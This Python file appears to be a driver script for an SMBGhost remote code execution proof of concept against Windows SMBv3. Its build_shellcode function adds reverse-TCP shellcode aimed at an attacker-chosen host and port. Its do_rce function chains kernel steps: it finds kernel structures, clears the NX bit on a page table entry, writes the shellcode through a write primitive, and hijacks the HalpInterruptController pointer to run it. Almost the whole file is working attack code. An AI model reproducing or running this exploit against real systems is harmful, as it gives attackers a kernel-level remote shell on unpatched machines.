import sys
import os

# Get the directory of the current script
main_path = os.path.dirname(__file__)

# Define the paths to add
paths_to_add = [
    os.path.abspath(os.path.join(main_path, "..")),
    os.path.abspath(os.path.join(main_path, "../SMBGhost_RCE_PoC")),
    os.path.abspath(os.path.join(main_path, "../src")),
]

# Add all paths at once
sys.path.extend(paths_to_add)

from SMBGhost_RCE_PoC.lznt1 import compress, compress_evil
from SMBGhost_RCE_PoC.smb_win import smb_negotiate, smb_compress
from SMBGhost_RCE_PoC.exploit import *
from shellcode import Win64ShellCode

def build_shellcode(reversed_ip:str, reversed_port:int):
    global KERNEL_SHELLCODE
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_INTERRUPT +
                                    HALP_APIC_REQ_INTERRUPT_OFFSET)
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_APIC_INTERRUPT)
    # KERNEL_SHELLCODE += USER_PAYLOAD
    KERNEL_SHELLCODE += Win64ShellCode.reverse_tcp(reversed_ip, reversed_port)

def do_rce(target_ip:str, target_port:int,
         host_ip:str = '127.0.0.1', host_port:int=31337):
    find_low_stub(target_ip, target_port)
    find_pml4_selfref(target_ip, target_port)
    search_hal_heap(target_ip, target_port)
    
    build_shellcode(host_ip, host_port)

    print("[+] built shellcode!")

    pKernelUserSharedPTE = get_pte_va(KUSER_SHARED_DATA)
    print("[+] KUSER_SHARED_DATA PTE at %lx" % pKernelUserSharedPTE)

    overwrite_pte(target_ip, target_port, pKernelUserSharedPTE)
    print("[+] KUSER_SHARED_DATA PTE NX bit cleared!")
    
    # TODO: figure out why we can't write the entire shellcode data at once. There is a check before srv2!Srv2DecompressData preventing the call of the function.
    to_write = len(KERNEL_SHELLCODE)
    write_bytes = 0
    while write_bytes < to_write:
        write_sz = min([write_unit, to_write - write_bytes])
        write_primitive(target_ip, target_port, KERNEL_SHELLCODE[write_bytes:write_bytes + write_sz], pshellcodeva + write_bytes)
        write_bytes += write_sz
    
    print("[+] Wrote shellcode at %lx!" % pshellcodeva)

    # input("[+] Press a key to execute shellcode!")
    print("[+] Execute shellcode!")
    
    write_primitive(target_ip, target_port, struct.pack("<Q", pshellcodeva), PHALP_INTERRUPT + HALP_APIC_REQ_INTERRUPT_OFFSET)
    print("[+] overwrote HalpInterruptController pointer, should have execution shortly...")
    

def main():
    pass

if __name__ == "__main__":
    main()